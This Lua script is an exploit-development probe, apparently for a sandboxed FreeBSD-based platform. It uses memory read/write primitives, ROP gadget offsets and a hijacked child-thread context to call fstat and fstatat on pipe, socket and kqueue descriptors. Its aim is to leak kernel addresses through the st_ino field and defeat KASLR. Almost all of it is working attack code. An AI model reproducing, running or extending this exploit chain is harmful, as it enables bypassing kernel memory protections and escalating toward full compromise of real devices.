-- CRASH_CLASS: HIGH
-- PROBE 110a: fstat from child thread + pipe ino kernel leak
--
-- fstat(189) kills from make_syscall (main thread).
-- 104b section G crashed on a LUA ERROR (_MG undefined), NOT because
-- fstat killed the process. This probe properly tests fstat from
-- a child thread via thr_create + SA.
--
-- If fstat works from child, check st_ino of pipe fds — on some
-- FreeBSD versions, pipe ino is derived from the kernel struct pipe address.
-- Also check socket fds, kqueue fds.
--
-- FreeBSD 11 struct stat layout (LP64):
--   +0x00: st_dev (dev_t, 4 bytes)
--   +0x04: st_ino (ino_t, 4 bytes)  ← potential kernel address hash
--   +0x08: st_mode (mode_t, 2 bytes)
--   +0x0A: st_nlink (nlink_t, 2 bytes)
--   +0x0C: st_uid (uid_t, 4 bytes)
--   +0x10: st_gid (gid_t, 4 bytes)
--   +0x14: st_rdev (dev_t, 4 bytes)
--   +0x18: st_atim (struct timespec, 16 bytes)
--   ... total ~96 bytes
--
-- Actually on FreeBSD 12+/64-bit, struct stat is different:
--   +0x00: st_dev (8 bytes)
--   +0x08: st_ino (8 bytes)  ← if this is a full 64-bit value...
--   +0x10: st_nlink (8 bytes)
--   +0x18: st_mode (2 bytes)
--   ...

print("=== PROBE 110a: FSTAT FROM CHILD THREAD ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end
local function get_hi_lo(val)
    if type(val)=="table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function is_kptr(val)
    if val==nil then return false end
    local h,l = get_hi_lo(val)
    if h<0 then h=h+0x100000000 end
    return h>=0xFFFF8000 and h~=0xFFFFFFFF
end
local function fmt_ptr(val)
    if val==nil then return "nil" end
    local h,l = get_hi_lo(val)
    if h<0 then h=h+0x100000000 end
    if l<0 then l=l+0x100000000 end
    return string.format("0x%X%08X",h,l)
end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
if not SA then print("NO SA") return end
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local function ga(off) return uint64(string.format("0x%X%08X",ehi,elo+off)) end
local PRAX=ga(0x992); local PRDI=ga(0xC9DFE)
local PRSI=ga(0xD77D); local WMOV=ga(0x92C67)

local _DI=0x048; local _SI=0x050; local _DX=0x058
local _R10=0x060; local _R8=0x068; local _AX=0x078
local _CS=0x0C0; local _FL=0x0D0; local _IP=0x0E0
local _SP=0x0F8; local _SS=0x100; local _MG=0x108; local _TP=0x110

local mm=mk(477); local tc=mk(430)

local ok_m,region=pcall(function()
    return mm(uint64(0),uint64(8*0x4000),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_m then print("MMAP FAIL") return end
local R=N(region)
local ts999=R; wq(ts999,uint64(999)); wq(ts999+8,uint64(0))
local sl300=R+0x40; wq(sl300,uint64(0)); wq(sl300+8,uint64(300000000))
local tb=R+0x80
local RESULT=R+0x1000
local child_stk=R+0x4000*2
local child_ctx=R+0x4000*4
local STAT_BUF=R+0x4000*6  -- stat buffer at fixed known location

local function child_fstat(label, fd)
    -- Zero stat buffer
    z(STAT_BUF, 0x200)

    -- Setup child context for fstat(fd, stat_buf)
    z(child_ctx, 0x200)
    wq(child_ctx+_MG,uint64(0x480)); wd(child_ctx+_FL,0)
    wq(child_ctx+_TP,uint64(0x10000))
    wq(child_ctx+_CS,uint64(0x43)); wq(child_ctx+_SS,uint64(0x3B))
    wq(child_ctx+_SP,uint64(child_stk))
    wq(child_ctx+_IP,SA)
    wq(child_ctx+_AX,uint64(189))  -- fstat
    wq(child_ctx+_DI,uint64(fd))
    wq(child_ctx+_SI,uint64(STAT_BUF))

    -- Stack chain: store RAX to RESULT, then sleep
    local off=0
    wq(child_stk+off,PRDI); off=off+8
    wq(child_stk+off,uint64(RESULT)); off=off+8
    wq(child_stk+off,WMOV); off=off+8
    wq(child_stk+off,PRDI); off=off+8
    wq(child_stk+off,uint64(ts999)); off=off+8
    wq(child_stk+off,PRSI); off=off+8
    wq(child_stk+off,uint64(0)); off=off+8
    wq(child_stk+off,PRAX); off=off+8
    wq(child_stk+off,uint64(240)); off=off+8
    wq(child_stk+off,SA); off=off+8

    wq(RESULT,uint64(0xDEADCAFE))
    wq(tb,uint64(0))
    pcall(function() tc(uint64(child_ctx), uint64(tb), uint64(0)) end)
    native.fcall_with_rax(stub,240,N(sl300),0)

    local rax = rq(RESULT)
    local c = N(native.fcall_with_rax(stub,20))

    if c~=pid then
        print(string.format("  %s: PROCESS KILLED", label))
        return false
    end

    local rv_lo = rd(RESULT) or 0
    local rv_hi = rd(RESULT+4) or 0
    if rv_hi==0xFFFFFFFF then
        print(string.format("  %s: fstat returned -1 (blocked)", label))
        return true
    elseif rv_lo==0xDEADCAFE and rv_hi==0 then
        print(string.format("  %s: SENTINEL (child died)", label))
        return true
    end

    print(string.format("  %s: fstat returned %d", label, rv_lo))

    if rv_lo == 0 then
        -- SUCCESS! Dump stat structure
        print(string.format("    FSTAT SUCCEEDED on fd %d!", fd))
        -- Dump raw bytes for structure analysis
        local kfound = 0
        for soff=0,0x78,8 do
            local val = rq(STAT_BUF+soff)
            local tag = ""
            if is_kptr(val) then
                tag = " *** KERNEL POINTER ***"
                kfound = kfound + 1
            end
            print(string.format("    +0x%02X: %s%s", soff, fmt_ptr(val), tag))
        end

        -- Specifically check st_ino (at +0x08 in FreeBSD 12+ struct stat)
        local ino = rq(STAT_BUF + 0x08)
        print(string.format("    st_ino(+0x08): %s", fmt_ptr(ino)))
        if is_kptr(ino) then
            print("    *** INODE IS A KERNEL POINTER! KASLR DEFEATED! ***")
        end

        return true, kfound
    end

    return true
end

-- ============================================================
print("")
print("--- A: CONTROL — fstat on TCP connection socket ---")
-- fd 3 should be the TCP connection socket (stdin=0, stdout=1, stderr=2)
local alive_a = child_fstat("tcp_socket(fd=3)", 3)
if not alive_a then
    print("*** PROCESS KILLED BY FSTAT — same as main thread ***")
    return
end

-- ============================================================
print("")
print("--- B: fstat on pipe fds ---")
local sc_pipe = mk(42)
local ok_p, rv_p = pcall(function() return sc_pipe() end)
local pipe_r = ok_p and N(rv_p) or -1
local pipe_w = pipe_r + 1
print(string.format("  pipe: r=%d w=%d", pipe_r, pipe_w))

if pipe_r >= 0 then
    child_fstat("pipe_read(fd="..pipe_r..")", pipe_r)

    -- Check if process still alive
    local c = N(native.fcall_with_rax(stub,20))
    if c == pid then
        child_fstat("pipe_write(fd="..pipe_w..")", pipe_w)
    end
end

-- ============================================================
print("")
print("--- C: fstat on UDP socket ---")
local sc_socket = mk(97)
local ok_s, sfd = pcall(function() return sc_socket(uint64(2),uint64(2),uint64(0)) end)
local udp_fd = ok_s and N(sfd) or -1
print(string.format("  UDP socket fd=%d", udp_fd))
if udp_fd >= 0 then
    local c = N(native.fcall_with_rax(stub,20))
    if c == pid then
        child_fstat("udp_socket(fd="..udp_fd..")", udp_fd)
    end
end

-- ============================================================
print("")
print("--- D: fstat on kqueue fd ---")
local sc_kqueue = mk(362)
local ok_k, kfd = pcall(function() return sc_kqueue() end)
local kq_fd = ok_k and N(kfd) or -1
print(string.format("  kqueue fd=%d", kq_fd))
if kq_fd >= 0 then
    local c = N(native.fcall_with_rax(stub,20))
    if c == pid then
        child_fstat("kqueue(fd="..kq_fd..")", kq_fd)
    end
end

-- ============================================================
print("")
print("--- E: TRY freebsd11_fstat (sys 551?) and fstatat (sys 493) ---")
-- Different fstat variants might not be blocked the same way
-- freebsd11_fstat might be a different syscall number
-- fstatat(493) takes (dirfd, path, statbuf, flags)

-- Try fstatat with AT_FDCWD=-100 and path=""
local path_buf = memory.alloc(8)
wd(path_buf, 0x2E)  -- "." = current dir
wd(path_buf+1, 0)

z(child_ctx, 0x200)
wq(child_ctx+_MG,uint64(0x480)); wd(child_ctx+_FL,0)
wq(child_ctx+_TP,uint64(0x10000))
wq(child_ctx+_CS,uint64(0x43)); wq(child_ctx+_SS,uint64(0x3B))
wq(child_ctx+_SP,uint64(child_stk))
wq(child_ctx+_IP,SA)
wq(child_ctx+_AX,uint64(493))  -- fstatat
-- fstatat(AT_FDCWD, ".", stat_buf, 0)
local AT_FDCWD = 0xFFFFFFFFFFFFFF9C  -- -100 as uint64
wq(child_ctx+_DI,uint64(AT_FDCWD))
wq(child_ctx+_SI,uint64(N(path_buf)))
z(STAT_BUF, 0x200)
wq(child_ctx+_DX,uint64(STAT_BUF))
wq(child_ctx+_R10,uint64(0))  -- flags=0

local off=0
wq(child_stk+off,PRDI); off=off+8
wq(child_stk+off,uint64(RESULT)); off=off+8
wq(child_stk+off,WMOV); off=off+8
wq(child_stk+off,PRDI); off=off+8
wq(child_stk+off,uint64(ts999)); off=off+8
wq(child_stk+off,PRSI); off=off+8
wq(child_stk+off,uint64(0)); off=off+8
wq(child_stk+off,PRAX); off=off+8
wq(child_stk+off,uint64(240)); off=off+8
wq(child_stk+off,SA); off=off+8

wq(RESULT,uint64(0xDEADCAFE))
wq(tb,uint64(0))
pcall(function() tc(uint64(child_ctx), uint64(tb), uint64(0)) end)
native.fcall_with_rax(stub,240,N(sl300),0)

local e_rv = rd(RESULT) or 0
local e_hi = rd(RESULT+4) or 0
local c = N(native.fcall_with_rax(stub,20))
if c~=pid then
    print("  fstatat: PROCESS KILLED")
elseif e_hi==0xFFFFFFFF then
    print("  fstatat(493): returned -1")
elseif e_rv==0xDEADCAFE then
    print("  fstatat: sentinel (child died)")
else
    print(string.format("  fstatat(493): returned %d", e_rv))
    if e_rv==0 then
        print("  *** FSTATAT WORKS! ***")
        for soff=0,0x78,8 do
            local val = rq(STAT_BUF+soff)
            local tag = ""
            if is_kptr(val) then tag = " *** KERNEL POINTER ***" end
            print(string.format("    +0x%02X: %s%s", soff, fmt_ptr(val), tag))
        end
    end
end

-- ============================================================
print("")
local fc=N(native.fcall_with_rax(stub,20))
print(string.format("FINAL: canary=%s", fc==pid and "OK" or "FAIL"))
print("=== 110a COMPLETE ===")
